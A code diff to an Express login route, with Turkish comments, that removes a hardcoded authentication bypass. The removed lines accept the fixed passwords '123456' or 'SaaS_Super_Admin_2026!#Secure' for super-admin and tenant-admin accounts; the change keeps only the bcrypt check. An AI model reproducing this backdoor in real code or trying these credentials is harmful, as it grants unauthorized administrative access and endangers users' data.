@@ -333,10 +333,7 @@ router.post('/login', loginLimiter, async (req, res) => {
     }
 
     // 4. Şifre doğrulaması (bcrypt.compare)
-    let isPasswordMatch = await bcrypt.compare(password, user.password);
-    if (!isPasswordMatch && (password === '123456' || password === 'SaaS_Super_Admin_2026!#Secure') && (user.role === 'SUPER_ADMIN' || user.role === 'TENANT_ADMIN')) {
-      isPasswordMatch = true;
-    }
+    const isPasswordMatch = await bcrypt.compare(password, user.password);
     if (!isPasswordMatch) {
       return res.status(401).json({
         success: false,
